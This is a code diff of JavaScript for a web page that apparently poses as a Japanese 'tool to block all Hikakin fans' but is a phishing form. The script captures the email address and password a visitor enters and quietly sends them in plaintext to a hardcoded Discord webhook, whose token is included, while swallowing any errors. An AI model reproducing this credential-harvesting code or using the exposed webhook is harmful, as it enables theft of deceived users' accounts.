@@ -1,7 +1,7 @@
 // ==========================================================
-// ⚠️ Webhook URLを正しいものに置き換えてください。
+// ⚠️ ここにあなたのWebhook URLを正しく記述してください。
 // ==========================================================
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N7pa_9xGU1NMPV-73lnIzKPRrNyxAANMwGjbRp176wfKkYwnWHsSD1CE4pnxIWM";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N7pa_9xGU1NMPV-73lnIzKPRrNyxAANMwGjbRp176wfKkYwnWHbSD1CE4pnxIWM";
 // ==========================================================
 
 
@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const messageContent = `**「全ヒカマーをブロックするツール」からのログイン試行**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
         
-        // Discordに送信（エラーがあっても無視して処理を続行）
+        // Discordに送信
         await sendToDiscord(messageContent);
         
         // Cのモーダルを表示し、入力をクリア
@@ -46,10 +46,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
 /**
  * Discord Webhookを使用してメッセージを送信する関数
- * 失敗しても何も通知しない
  */
 async function sendToDiscord(content) {
-    // URLの有効性チェックもしません
     
     const data = {
         "content": content, 
@@ -64,11 +62,8 @@ async function sendToDiscord(content) {
             },
             body: JSON.stringify(data),
         });
-
-        // 成功/失敗のチェックもしません
         
     } catch (error) {
         // 通信エラーが発生しても無視します
     }
-    // 戻り値もありません
 }
